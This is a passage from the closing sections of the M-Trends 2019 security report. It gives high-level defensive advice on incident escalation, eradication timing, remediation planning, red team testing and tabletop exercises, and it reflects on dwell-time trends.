allow investigators to determine when escalation is
necessary. Thresholds should not be based solely
on simple volume metrics, but the context of the
identified activity. Organizations should understand
the threats facing them, how targeted threat
actors operate and the forensic evidence that can
distinguish a commodity threat from an advanced
attacker. Define thresholds and consistently refine
them based on this information.
–– Define roles and responsibilities for triage and

investigation support throughout the organization
to enable timely communication during escalation of
events or incidents.
–– Develop an escalation matrix that will allow

investigators to quickly determine the appropriate
timing and path for escalations based on incident
severity.
–– Incorporate the concept of eradication timing,

depending on the context of the breach.
–– Include guidelines on eradication timing in playbooks

that accommodate the threat and severity matrix.
Escalate relevant information to stakeholders to
empower them to make decisions about eradication
timing.
–– Develop incident remediation plans for complex

activities that may be required following a breach.
These plans will help the organization properly plan
for and execute the operations required to remove a
threat from the environment.
–– Coordinate and develop remediation plans with

input from all stakeholders that will be involved with
implementing technical plans.

Conclusion
We have observed victim organizations with consistent
weaknesses in their security program that led to attackers
successfully accomplishing their goals and victim
organizations failing at detecting, investigating, and
responding to attacker activity. Organizations can learn
from these mistakes to improve their resilience to targeted
attackers, enable their detection and response teams to
more effectively answer critical investigative questions and
effectively remediate breaches.
By following the guided principles and methodology
of premediation, organizations can naturally create the
foundational elements for proactively hardening and
securing their infrastructure based on proven and tested
security controls which are often used to contain and
eradicate attackers from environments. This proactive
methodology is a proven and effective way to help prevent
an initial event from becoming a large-scale incident
that impacts an organization’s system availability, data
confidentially and brand reputation.
Organizations in a reactive state use this same
premediation framework to eradicate threat actors
and harden their environments to prevent against recompromise and future attacks. In a proactive state,
these principles can bolster existing security controls and
mitigate risks related to tactics and techniques used by
threat actors.
By regularly reviewing and updating their incident
Response Plans and associated use cases and playbooks,
organizations can mitigate the risk of destruction of
important evidence, failure to identify major breaches,
and extending the duration of breaches. Organization
should incorporate important concepts such as evidence
preservation during remediation activities, context of alerts
instead of simple volume metrics, and eradication timing
into these documents. This will empower front line analysts
to effectively escalate relevant information to decision
makers and avoid costly mistakes.

SPECIAL REPORT | M-TRENDS 2019

Through one lens, it’s easy to see how much has changed
in the cyber security industry in the past decade. The
global median dwell time is now 78 days, nearly a full
year less than it was in 2011, when we first reported the
statistic. Imagine how bad things would be today if the
average attacker was still hiding in systems for that long.
We learned firsthand in this year’s report in the case of
the telecommunications company and the attacker who
maintained access for at least three years.

A red team engagement is one of the best ways for
organizations to test their security. Mandiant red teams
use nondestructive methods to accomplish a set of
jointly agreed upon mission objectives. The red team
closely mimics a real attacker’s active and stealthy attack
methods by using tactics, techniques and procedures seen
during some of the latest incident response engagements.
This helps security teams assess their ability to detect and
respond to an active attacker scenario.

Yet through another lens, not much has changed in the
industry in the past decade. Until core technology evolves
beyond the familiar, the very essence of cyber security will
likely remain the same: threat actors from various nations
with diverse motivations will target networks and systems
around the globe, and defenders will have what often feels
like an impossible task of keeping up with those threats,
and doing everything they can—and that is required—to
shut them down.

To also improve preparedness, we encourage organizations
to hold incident response tabletop exercises to simulate
typical intrusion scenarios. These exercises help expose
participants—notably executives, legal personnel and other
staff—to incident response processes and concepts.

There are many important takeaways from M-Trends
2019. We learned about the latest APT threat activity
stemming from North Korea, Russia, Iran and China. We
learned about the value of early identification and having
visibility across all solutions and services. And based on
the experience of our Mandiant red teams, we learned how
mismanaged multifactor authentication, weak passwords
and a lack of account segmentation will almost certainly
lead to a breach.

FireEye will continue to publish M-Trends in the years
to come, to improve our collective security awareness,
knowledge and capabilities.

One other thing that hasn’t changed in 10 years: cyber
security professionals continue to diligently defend against
bad actors that determinedly pursue their objectives.
